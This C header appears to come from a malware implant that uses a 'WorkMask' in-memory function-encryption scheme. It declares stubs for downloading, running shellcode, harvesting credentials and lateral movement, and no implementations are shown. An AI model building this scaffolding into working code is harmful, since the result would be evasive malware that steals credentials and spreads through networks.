#pragma once
#ifndef PROTECTED_FUNCS_H
#define PROTECTED_FUNCS_H

#include "workmask.h"

/*
 * Example protected functions.
 * Each has a corresponding HIRMETA_ENTRY declared with DECLARE_WORKMASK_META.
 * The REG_ prefix follows Function Peekaboo convention for naming
 * functions that are registered for WorkMask protection.
 *
 * The post-link tool (hir_encrypt.py) identifies these functions by
 * matching symbol names in the object file and patches their metadata
 * entries with correct codeOffset and funcSize values.
 */

/* Function declarations */
void REG_download_handler(void* url, void* buffer, uint32_t bufSize);
void REG_execute_payload(void* shellcode, uint32_t scSize);
void REG_credential_harvest(void* output, uint32_t outSize);
int  REG_lateral_movement(const char* target, void* payload, uint32_t payloadSize);

/* Metadata entry externs (defined in protected_funcs.c) */
extern HIRMETA_ENTRY g_meta_download_handler;
extern HIRMETA_ENTRY g_meta_execute_payload;
extern HIRMETA_ENTRY g_meta_credential_harvest;
extern HIRMETA_ENTRY g_meta_lateral_movement;

/* Metadata table for enumeration */
extern HIRMETA_ENTRY* g_workmask_table[];
extern const uint32_t g_workmask_table_count;

#endif /* PROTECTED_FUNCS_H */
